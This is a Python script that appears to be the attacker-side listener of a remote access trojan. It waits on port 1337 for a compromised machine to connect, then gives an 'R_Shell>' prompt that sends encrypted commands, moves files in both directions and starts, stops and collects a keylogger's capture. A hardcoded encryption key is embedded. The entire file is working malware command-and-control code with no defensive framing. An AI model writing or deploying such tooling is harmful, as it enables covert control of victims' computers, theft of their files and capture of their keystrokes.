#!/usr/bin/env python3
import socket
import os
import sys
import struct
from cryptography.fernet import Fernet

FERNET_KEY = b"5QSEoLTqE09epZHZCvqw_QIw4gkx0pLOPY8FkJGK63Q="
cipher = Fernet(FERNET_KEY)

def send_encrypted(conn, data_bytes: bytes):
    encrypted = cipher.encrypt(data_bytes)
    length = struct.pack(">I", len(encrypted))
    conn.sendall(length + encrypted)

def recv_encrypted(conn) -> bytes:
    raw_len = b""
    while len(raw_len) < 4:
        chunk = conn.recv(4 - len(raw_len))
        if not chunk:
            raise ConnectionError("Connection closed during length read")
        raw_len += chunk
    msg_len = struct.unpack(">I", raw_len)[0]

    encrypted_msg = b""
    while len(encrypted_msg) < msg_len:
        chunk = conn.recv(msg_len - len(encrypted_msg))
        if not chunk:
            raise ConnectionError("Connection closed during message read")
        encrypted_msg += chunk

    plaintext = cipher.decrypt(encrypted_msg)
    return plaintext

def download_file(conn, filename):
    with open(filename, "wb") as f:
        print(f"[*] Downloading {filename}...")
        while True:
            chunk = recv_encrypted(conn)
            if chunk == b"__EOF__":
                break
            f.write(chunk)
        print(f"[+] Download complete: {filename}")

def upload_file(conn, filename):
    if not os.path.exists(filename):
        print(f"[-] File not found: {filename}")
        return
    with open(filename, "rb") as f:
        print(f"[*] Uploading {filename}...")
        while True:
            chunk = f.read(16384)
            if not chunk:
                break
            send_encrypted(conn, chunk)
        send_encrypted(conn, b"__EOF__")
        print(f"[+] Upload complete: {filename}")

def command_loop(conn):
    while True:
        try:
            command = input("R_Shell> ").strip()
            if not command:
                continue

            send_encrypted(conn, command.encode())

            if command.lower() in ("exit", "quit"):
                print("[*] Exiting shell...")
                break

            if command.startswith("upload "):
                _, filename = command.split(" ", 1)
                upload_file(conn, filename)
                continue

            if command.startswith("download "):
                _, filename = command.split(" ", 1)
                download_file(conn, filename)
                continue

            if command == "keylog_start" or command == "keylog_stop":
                print(f"[*] Sent '{command}' command.")
                continue

            if command == "keylog_dump":
                with open("keylog_received.txt", "wb") as f:
                    print("[*] Receiving keylog file...")
                    while True:
                        chunk = recv_encrypted(conn)
                        if chunk == b"__EOF__":
                            break
                        f.write(chunk)
                print("[+] Keylog saved to 'keylog_received.txt'")
                continue

            response = recv_encrypted(conn)
            print(response.decode(errors="ignore"))

        except KeyboardInterrupt:
            print("\n[*] Keyboard Interrupt detected, closing...")
            break
        except Exception as e:
            print(f"[!] Listener error: {e}")
            break

def start_listener(ip="0.0.0.0", port=1337):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((ip, port))
    server_socket.listen(1)
    print(f"[*] Listening on {ip}:{port}...")

    conn, addr = server_socket.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")

    command_loop(conn)

    conn.close()
    server_socket.close()
    print("[*] Connection closed.")

if __name__ == "__main__":
    start_listener()
